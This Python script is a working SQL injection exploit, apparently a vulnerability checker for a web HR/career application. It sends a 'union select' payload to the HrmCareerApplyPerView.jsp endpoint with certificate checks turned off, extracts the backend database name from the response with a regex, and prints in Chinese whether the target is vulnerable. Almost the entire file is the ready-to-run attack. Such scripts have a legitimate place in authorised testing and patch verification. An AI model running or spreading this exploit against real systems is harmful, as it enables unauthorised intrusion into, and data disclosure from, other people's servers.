#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()
patt = "<TD class=Field>\s*([^\s]+)\s*</TD>"

def verify(site):
    burp0_url = site + "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,3,db_name(1),5,6,7"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    info = re.findall(patt, r.text)
    if len(info) != 0:
        return info[1]
    return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
